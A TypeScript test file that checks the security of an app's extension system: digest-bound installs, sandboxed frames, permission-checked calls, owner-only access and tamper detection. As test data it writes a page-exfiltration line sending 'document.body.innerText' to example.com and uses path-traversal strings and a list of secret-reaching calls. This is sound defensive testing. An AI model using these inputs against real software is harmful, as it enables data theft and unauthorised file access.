// Workspace extensions through the real server (GitHub 507): installing
// from a folder only as it was looked at, a framed document served under
// its sandbox, calls checked against the grant, and nobody but the owner
// reaching any of it. The rules on their own are in
// test/extensions.test.ts.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { allows } from "../server/agent-cli.ts";
import { startHarness } from "./helpers/server.ts";
import { agentOn, fakeProvider, idle, messagesOf, waitFor } from "./helpers/turns.ts";

const SECRET = "sk-live-extension-must-never-see-this";
const MEMBER_TOKEN = "fixture-member-device-token-ext";
const sha = (value: string) => createHash("sha256").update(value).digest("hex");

function extensionFolder(root: string, manifest: Record<string, unknown>, extra: Record<string, string> = {}) {
  const dir = join(root, String(manifest.id ?? "ext"));
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "bloks-extension.json"), JSON.stringify(manifest));
  writeFileSync(join(dir, "panel.html"), '<link rel="stylesheet" href="panel.css"><h1>Team</h1><script src="panel.js"></script>');
  writeFileSync(join(dir, "panel.css"), "h1{color:var(--brand)}");
  writeFileSync(join(dir, "panel.js"), "bloks.call('agents.list').then(function(a){document.body.dataset.n=a.length})");
  for (const [name, text] of Object.entries(extra)) writeFileSync(join(dir, name), text);
  return dir;
}

const manifest = (over: Record<string, unknown> = {}) => ({
  manifestVersion: 1,
  id: "team-status",
  name: "Team status",
  version: "1.0.0",
  description: "Who is working.",
  bloks: ">=3.0.0",
  permissions: ["agents:read", "storage"],
  panels: [{ id: "status", title: "Team status", entry: "panel.html" }],
  commands: [{ id: "ask", title: "Ask for a status update" }],
  events: ["agents.changed"],
  ...over,
});

test("an extension is installed as it was looked at, served in its sandbox, and asks only what it was granted", { timeout: 180_000 }, async (t) => {
  const home = mkdtempSync(join(tmpdir(), "bloks-test-ext-"));
  mkdirSync(join(home, ".bloks"));
  writeFileSync(
    join(home, ".bloks", "config.json"),
    JSON.stringify({
      secrets: { OPENAI_API_KEY: SECRET },
      remote: { memberDevices: [{ id: "member-device", name: "Member phone", hash: sha(MEMBER_TOKEN), pairedAt: 1, personId: "fixture-member" }] },
    }),
  );
  const p = await fakeProvider(t);
  p.state.answerAtOnce = true;
  const h = await startHarness({ HOME: home });
  t.after(() => h.stop());
  t.after(() => rmSync(home, { recursive: true, force: true }));
  const folders = mkdtempSync(join(tmpdir(), "bloks-ext-src-"));
  t.after(() => rmSync(folders, { recursive: true, force: true }));
  const ada = await agentOn(h, p.port, "Ada");

  const post = (path: string, body: unknown) => h.fetch(path, { method: "POST", body: JSON.stringify(body) });
  const dir = extensionFolder(folders, manifest());

  // ── looking, then installing exactly what was looked at ──
  const looked = await (await post("/api/extensions/inspect", { path: dir })).json();
  assert.equal(looked.ok, true, JSON.stringify(looked));
  assert.deepEqual(looked.permissions.map((x: any) => x.id), ["agents:read", "storage"]);
  assert.ok(looked.permissions.every((x: any) => typeof x.words === "string" && x.words.length > 10), "each permission is said in words");

  const wrongGrant = await post("/api/extensions", { path: dir, digest: looked.digest, grant: ["agents:read"] });
  assert.equal(wrongGrant.status, 409, "a grant short of what it asks is not an install");
  const widerGrant = await post("/api/extensions", { path: dir, digest: looked.digest, grant: ["agents:read", "storage", "agents:message"] });
  assert.equal(widerGrant.status, 409, "nor a grant beyond it");
  writeFileSync(join(dir, "panel.js"), "/* changed after the look */");
  const changed = await post("/api/extensions", { path: dir, digest: looked.digest, grant: ["agents:read", "storage"] });
  assert.equal(changed.status, 409, "files that changed after the look are not what was approved");
  const again = await (await post("/api/extensions/inspect", { path: dir })).json();
  const installed = await post("/api/extensions", { path: dir, digest: again.digest, grant: ["storage", "agents:read"] });
  assert.equal(installed.status, 201, await installed.clone().text());
  const { extension } = await installed.json();
  assert.equal(extension.enabled, true);
  assert.equal(extension.intact, true);
  assert.ok(existsSync(join(home, ".bloks", "extensions", "team-status", "panel.html")));
  assert.equal((await h.json("/api/extensions")).extensions.length, 1);

  // ── the framed document ──
  const theme = encodeURIComponent(JSON.stringify({ scheme: "dark", background: "#101013" }));
  const frame = await h.fetch(`/api/extensions/team-status/frame/status?theme=${theme}`);
  assert.equal(frame.status, 200);
  const csp = frame.headers.get("content-security-policy") ?? "";
  assert.match(csp, /^sandbox allow-scripts;/);
  assert.match(csp, /connect-src 'none'/);
  assert.match(csp, /default-src 'none'/);
  assert.doesNotMatch(csp, /allow-same-origin/);
  assert.equal(frame.headers.get("cache-control"), "no-store");
  const doc = await frame.text();
  assert.match(doc, /h1\{color:var\(--brand\)\}/, "its stylesheet is folded in");
  assert.match(doc, /\/\* changed after the look \*\//, "its script is folded in, as installed");
  assert.match(doc, /--bloks-bg:#101013/);
  assert.doesNotMatch(doc, new RegExp(SECRET));
  for (const which of ["background", "..%2F..%2Fconfig.json", "bloks-extension", "status%2F..%2F..%2F"]) {
    assert.equal((await h.fetch(`/api/extensions/team-status/frame/${which}`)).status, 404, which);
  }
  assert.equal((await h.fetch("/api/extensions/..%2Fextensions/frame/status")).status, 404);

  // ── calls, against the grant ──
  const call = (method: string, params: unknown = null) => post("/api/extensions/team-status/call", { method, params });
  const listed = await (await call("agents.list")).json();
  assert.deepEqual(listed.result.find((a: any) => a.id === ada.id), { id: ada.id, name: "Ada", working: false });
  for (const agent of listed.result) assert.deepEqual(Object.keys(agent).sort(), ["id", "name", "working"], "a name and whether it works, nothing else");
  assert.equal((await call("storage.set", { key: "seen", value: { n: 1 } })).status, 200);
  assert.deepEqual((await (await call("storage.get", { key: "seen" })).json()).result, { n: 1 });
  assert.equal((await call("storage.set", { key: "big", value: "x".repeat(300 * 1024) })).status, 413);
  assert.equal((await call("agents.message", { agentId: ada.id, text: "hello" })).status, 403, "not granted");
  for (const reach of ["secrets.list", "config.get", "connections.list", "fetch", "agents.token", "__proto__", "constructor"]) {
    const res = await call(reach);
    assert.equal(res.status, 403, reach);
  }
  assert.equal((await call("panel.open", { panel: "status" })).status, 400, "the page answers that one, never the server");
  assert.equal((await call("notify", { text: "x" })).status, 403, "and one it was not granted is refused first");
  // what it kept is its own, beside the workspace and not in its folder
  assert.match(readFileSync(join(home, ".bloks", "extension-data", "team-status.json"), "utf8"), /"seen"/);

  // ── nobody but the owner ──
  // a website, and a sandboxed frame of anybody's (Origin null), which is
  // what an extension's own document would be if it could fetch at all
  for (const origin of ["https://example.com", "null", "http://127.0.0.1:3000"]) {
    for (const [method, path] of [["GET", "/api/extensions"], ["POST", "/api/extensions/team-status/call"], ["GET", "/api/extensions/team-status/frame/status"]]) {
      const res = await h.fetchAs(origin, path, { method, ...(method === "POST" ? { body: JSON.stringify({ method: "agents.list" }) } : {}) });
      assert.equal(res.status, 403, `${origin} ${method} ${path}`);
    }
  }
  // a member's credential on this computer, and on the network
  const asMember = await h.fetch("/api/extensions", { headers: { authorization: `Bearer ${MEMBER_TOKEN}` } });
  assert.equal(asMember.status, 403);
  const memberCall = await h.fetch("/api/extensions/team-status/call", { method: "POST", headers: { authorization: `Bearer ${MEMBER_TOKEN}` }, body: JSON.stringify({ method: "agents.list" }) });
  assert.equal(memberCall.status, 403);
  // an agent's credential never reaches any of it
  for (const method of ["GET", "POST", "PATCH", "DELETE"]) {
    for (const path of ["/api/extensions", "/api/extensions/inspect", "/api/extensions/team-status", "/api/extensions/team-status/call", "/api/extensions/team-status/frame/status"]) {
      assert.equal(allows(ada.id, method, path).ok, false, `${method} ${path}`);
    }
  }
  // the owner's phone may see and switch, never install from a path
  await h.fetch("/api/pair", { method: "PUT", body: JSON.stringify({ enabled: true }) });
  const started = await h.json("/api/pair/start", { method: "POST" });
  const paired = await h.fetchRemote("/api/pair/claim", { method: "POST", body: JSON.stringify({ code: started.code, device: "Test iPhone" }) });
  assert.ok(paired.body?.token);
  assert.equal((await h.fetchRemote("/api/extensions", { token: paired.body.token })).status, 200);
  assert.equal((await h.fetchRemote("/api/extensions/inspect", { method: "POST", token: paired.body.token, body: JSON.stringify({ path: dir }) })).status, 403);
  assert.equal((await h.fetchRemote("/api/extensions", { method: "POST", token: paired.body.token, body: JSON.stringify({ path: dir, digest: again.digest, grant: ["agents:read", "storage"] }) })).status, 403);
  assert.equal((await h.fetchRemote("/api/extensions", { method: "GET", token: MEMBER_TOKEN })).status !== 200, true, "a member's phone is not the owner's");
  // nothing the owner's routes answered carried a secret
  assert.doesNotMatch(JSON.stringify(await h.json("/api/extensions")), new RegExp(SECRET));

  // ── tampering with the installed copy stops it ──
  writeFileSync(join(home, ".bloks", "extensions", "team-status", "panel.js"), "location='https://example.com/?'+document.body.innerText");
  const tampered = await h.fetch("/api/extensions/team-status/frame/status");
  assert.equal(tampered.status, 409);
  assert.match((await tampered.json()).error, /changed after it was installed/);
  assert.equal((await h.json("/api/extensions")).extensions[0].intact, false);

  // ── an update asks again for what is new, and a message needs it ──
  const v2 = extensionFolder(folders, manifest({ id: "team-status", version: "1.1.0", permissions: ["agents:read", "storage", "agents:message"] }));
  const lookedV2 = await (await post("/api/extensions/inspect", { path: v2 })).json();
  assert.deepEqual(lookedV2.installed, { version: "1.0.0", added: ["agents:message"], removed: [] });
  const updated = await post("/api/extensions", { path: v2, digest: lookedV2.digest, grant: ["agents:read", "storage", "agents:message"] });
  assert.equal(updated.status, 200);
  assert.equal((await updated.json()).extension.intact, true, "a fresh install is intact again");
  assert.deepEqual((await (await call("storage.get", { key: "seen" })).json()).result, { n: 1 }, "an update keeps its data");

  const sent = await call("agents.message", { agentId: ada.id, text: "STATUS-PLEASE" });
  assert.equal(sent.status, 200, await sent.clone().text());
  const said = await waitFor(async () => (await messagesOf(h, ada)).find((m) => m.role === "user" && String(m.text).includes("STATUS-PLEASE")));
  assert.ok(said, h.logs());
  assert.equal(said.via, "extension");
  assert.match(said.text, /The extension "Team status" sends this/);
  assert.match(said.text, /not the owner's/);
  assert.ok(await waitFor(() => p.sent("STATUS-PLEASE") > 0), "the agent's turn heard it");
  await idle(h, ada);
  assert.equal((await call("agents.message", { agentId: "nobody", text: "x" })).status, 400);

  // ── off, then gone ──
  assert.equal((await h.fetch("/api/extensions/team-status", { method: "PATCH", body: JSON.stringify({ enabled: false }) })).status, 200);
  assert.equal((await call("agents.list")).status, 409, "a switched-off extension answers nothing");
  assert.equal((await h.fetch("/api/extensions/team-status/frame/status")).status, 409);
  assert.equal((await h.fetch("/api/extensions/team-status", { method: "DELETE" })).status, 200);
  assert.equal(existsSync(join(home, ".bloks", "extensions", "team-status")), false);
  assert.equal(existsSync(join(home, ".bloks", "extension-data", "team-status.json")), false);
  assert.deepEqual((await h.json("/api/extensions")).extensions, []);
});

test("a folder that is not a good extension is refused with every reason", { timeout: 120_000 }, async (t) => {
  const h = await startHarness();
  t.after(() => h.stop());
  const folders = mkdtempSync(join(tmpdir(), "bloks-ext-bad-"));
  t.after(() => rmSync(folders, { recursive: true, force: true }));
  const bad = extensionFolder(folders, manifest({ id: "bad", permissions: ["secrets:read"], bloks: ">=99.0.0" }));
  const looked = await (await h.fetch("/api/extensions/inspect", { method: "POST", body: JSON.stringify({ path: bad }) })).json();
  assert.equal(looked.ok, false);
  assert.match(looked.problems.join("\n"), /secrets:read/);
  assert.match(looked.problems.join("\n"), /needs Bloks >=99\.0\.0/);
  const refused = await h.fetch("/api/extensions", { method: "POST", body: JSON.stringify({ path: bad, digest: looked.digest, grant: [] }) });
  assert.equal(refused.status, 422);
  assert.equal((await h.fetch("/api/extensions/inspect", { method: "POST", body: JSON.stringify({ path: join(folders, "nowhere") }) })).status, 400);
});
